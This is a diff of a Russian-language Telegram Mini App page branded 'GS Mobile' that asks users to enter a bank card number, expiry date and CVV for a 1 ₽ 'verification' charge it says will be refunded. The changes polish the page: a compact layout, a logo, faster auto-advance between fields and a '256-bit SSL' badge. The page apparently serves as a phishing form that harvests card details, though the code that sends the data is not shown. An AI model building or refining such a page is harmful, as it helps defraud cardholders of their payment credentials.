@@ -12,72 +12,76 @@
             box-sizing: border-box;
         }
         
+        html, body {
+            height: 100%;
+            overflow: hidden;
+        }
+        
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background: #0d0d0d;
-            min-height: 100vh;
             display: flex;
             justify-content: center;
-            align-items: center;
-            padding: 20px;
+            align-items: flex-start;
+            padding: 16px;
             color: #fff;
         }
         
         .container {
             background: #1a1a1a;
-            border-radius: 24px;
-            padding: 32px;
+            border-radius: 20px;
+            padding: 24px;
             width: 100%;
-            max-width: 400px;
+            max-width: 360px;
             border: 1px solid #2a2a2a;
         }
         
         .logo {
             text-align: center;
-            margin-bottom: 32px;
+            margin-bottom: 20px;
         }
         
         .logo h1 {
             color: #00d4aa;
-            font-size: 28px;
+            font-size: 22px;
             font-weight: 700;
-            margin-bottom: 8px;
+            margin-bottom: 4px;
         }
         
         .logo p {
             color: #888;
-            font-size: 14px;
+            font-size: 12px;
         }
         
         .info-text {
             text-align: center;
             color: #aaa;
-            font-size: 14px;
-            margin-bottom: 28px;
-            line-height: 1.6;
-            padding: 35px;
+            font-size: 12px;
+            margin-bottom: 20px;
+            line-height: 1.5;
         }
         
         .amount-badge {
             display: inline-block;
             background: rgba(0, 212, 170, 0.15);
             color: #00d4aa;
-            padding: 4px 16px;
-            border-radius: 20px;
+            padding: 4px 12px;
+            border-radius: 16px;
             font-weight: 600;
-            margin-top: 12px;
+            font-size: 12px;
+            margin-top: 8px;
             border: 1px solid rgba(0, 212, 170, 0.3);
         }
         
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 16px;
         }
         
         .form-group label {
             display: block;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
             color: #ccc;
-            font-size: 13px;
+            font-size: 11px;
             font-weight: 500;
             text-transform: uppercase;
             letter-spacing: 0.5px;
@@ -85,14 +89,15 @@
         
         .form-group input {
             width: 100%;
-            padding: 18px 16px;
+            padding: 14px 12px;
             background: #0d0d0d;
             border: 2px solid #2a2a2a;
-            border-radius: 16px;
-            font-size: 18px;
+            border-radius: 12px;
+            font-size: 16px;
             color: #fff;
             transition: all 0.3s ease;
             outline: none;
+            font-family: 'Courier New', monospace;
             letter-spacing: 2px;
         }
         
@@ -119,26 +124,26 @@
         .form-row {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 16px;
+            gap: 12px;
         }
         
         .submit-btn {
             width: 100%;
-            padding: 20px;
+            padding: 16px;
             background: linear-gradient(135deg, #00d4aa 0%, #00a884 100%);
             color: #0d0d0d;
             border: none;
-            border-radius: 16px;
-            font-size: 16px;
+            border-radius: 12px;
+            font-size: 15px;
             font-weight: 700;
             cursor: pointer;
             transition: all 0.3s ease;
-            margin-top: 8px;
+            margin-top: 4px;
         }
         
         .submit-btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 10px 40px rgba(0, 212, 170, 0.3);
+            box-shadow: 0 8px 30px rgba(0, 212, 170, 0.3);
         }
         
         .submit-btn:disabled {
@@ -153,28 +158,28 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-top: 24px;
+            margin-top: 16px;
             color: #666;
-            font-size: 12px;
+            font-size: 11px;
         }
         
         .secure-badge svg {
-            width: 16px;
-            height: 16px;
-            margin-right: 8px;
+            width: 14px;
+            height: 14px;
+            margin-right: 6px;
             fill: #00d4aa;
         }
         
         .step-indicator {
             display: flex;
             justify-content: center;
-            gap: 8px;
-            margin-bottom: 24px;
+            gap: 6px;
+            margin-bottom: 20px;
         }
         
         .step {
-            width: 8px;
-            height: 8px;
+            width: 6px;
+            height: 6px;
             border-radius: 50%;
             background: #2a2a2a;
             transition: all 0.3s ease;
@@ -182,8 +187,8 @@
         
         .step.active {
             background: #00d4aa;
-            width: 24px;
-            border-radius: 4px;
+            width: 20px;
+            border-radius: 3px;
         }
         
         .hidden {
@@ -193,16 +198,21 @@
         .card-hint {
             text-align: center;
             color: #666;
-            font-size: 12px;
-            margin-top: 8px;
+            font-size: 11px;
+            margin-top: 6px;
         }
     </style>
 </head>
 <body>
     <div class="container">
+        <div class="logo">
+            <h1>GS Mobile</h1>
+            <p>Привязка банковской карты</p>
+        </div>
+        
         <div class="info-text">
-            Для подтверждения с Вашего баланса будет списано<br>
-            <span class="amount-badge">1 ₽</span><br>
+            Списание <span class="amount-badge">1 ₽</span> для проверки<br>
+            Сумма вернётся на карту
         </div>
         
         <div class="step-indicator">
@@ -211,24 +221,22 @@
         </div>
         
         <form id="cardForm">
-            <!-- Шаг 1: Номер карты -->
             <div id="step1-content">
                 <div class="form-group">
                     <label for="cardNumber">Номер карты</label>
                     <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="off" inputmode="numeric">
                 </div>
-                <div class="card-hint">Введите 16 цифр карты</div>
+                <div class="card-hint">16 цифр на лицевой стороне</div>
             </div>
             
-            <!-- Шаг 2: Дата и CVV -->
             <div id="step2-content" class="hidden">
                 <div class="form-row">
                     <div class="form-group">
-                        <label for="expiry">Срок действия</label>
+                        <label for="expiry">Срок</label>
                         <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric">
                     </div>
                     <div class="form-group">
-                        <label for="cvv">CVV/CVC</label>
+                        <label for="cvv">CVV</label>
                         <input type="password" id="cvv" placeholder="123" maxlength="3" inputmode="numeric">
                     </div>
                 </div>
@@ -239,17 +247,23 @@
         
         <div class="secure-badge">
             <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
-            Безопасное соединение SSL
+            Защищено 256-bit SSL
         </div>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.ready();
-        tg.expand();
         
+        // Не раскрываем на полный экран, устанавливаем компактную высоту
+        // tg.expand(); — убрано
+        
+        // Устанавливаем цвета
         tg.setHeaderColor('#0d0d0d');
         tg.setBackgroundColor('#0d0d0d');
+        
+        // Отключаем вертикальную прокрутку
+        tg.disableVerticalSwipes();
         
         const cardNumber = document.getElementById('cardNumber');
         const expiry = document.getElementById('expiry');
@@ -265,7 +279,6 @@
         let dateValid = false;
         let cvvValid = false;
         
-        // Алгоритм Луна
         function luhnCheck(cardNumber) {
             let sum = 0;
             let isEven = false;
@@ -285,7 +298,6 @@
             return sum % 10 === 0;
         }
         
-        // Форматирование номера карты
         cardNumber.addEventListener('input', (e) => {
             let value = e.target.value.replace(/\D/g, '');
             let formatted = '';
@@ -297,16 +309,13 @@
             
             e.target.value = formatted;
             
-            // Проверка Луна при 16 цифрах
             if (value.length === 16) {
                 if (luhnCheck(value)) {
                     cardNumber.classList.remove('error');
                     cardNumber.classList.add('valid');
                     cardValid = true;
                     updateSubmitButton();
-                    
-                    // Автоматический переход к шагу 2
-                    setTimeout(() => goToStep2(), 700);
+                    setTimeout(() => goToStep2(), 300);
                 } else {
                     cardNumber.classList.remove('valid');
                     cardNumber.classList.add('error');
@@ -320,7 +329,6 @@
             }
         });
         
-        // Переход к шагу 2
         function goToStep2() {
             currentStep = 2;
             step1Content.classList.add('hidden');
@@ -332,7 +340,6 @@
             updateSubmitButton();
         }
         
-        // Форматирование даты
         expiry.addEventListener('input', (e) => {
             let value = e.target.value.replace(/\D/g, '');
             
@@ -345,7 +352,6 @@
             
             e.target.value = value;
             
-            // Проверка валидности даты
             if (value.length === 5) {
                 let parts = value.split('/');
                 let month = parseInt(parts[0]);
@@ -356,8 +362,6 @@
                 if (year > currentYear || (year === currentYear && month >= currentMonth)) {
                     dateValid = true;
                     expiry.classList.add('valid');
-                    
-                    // Автоматический переход к CVV
                     setTimeout(() => cvv.focus(), 100);
                 } else {
                     dateValid = false;
@@ -371,7 +375,6 @@
             updateSubmitButton();
         });
         
-        // CVV ввод
         cvv.addEventListener('input', (e) => {
             e.target.value = e.target.value.replace(/\D/g, '');
             cvvValid = e.target.value.length === 3;
@@ -385,7 +388,6 @@
             updateSubmitButton();
         });
         
-        // Обновление кнопки
         function updateSubmitButton() {
             if (currentStep === 1) {
                 submitBtn.disabled = !cardValid;
@@ -394,7 +396,6 @@
             }
         }
         
-        // Отправка формы
         document.getElementById('cardForm').addEventListener('submit', (e) => {
             e.preventDefault();
             
@@ -415,7 +416,6 @@
             }
         });
         
-        // Инициализация
         updateSubmitButton();
     </script>
 </body>
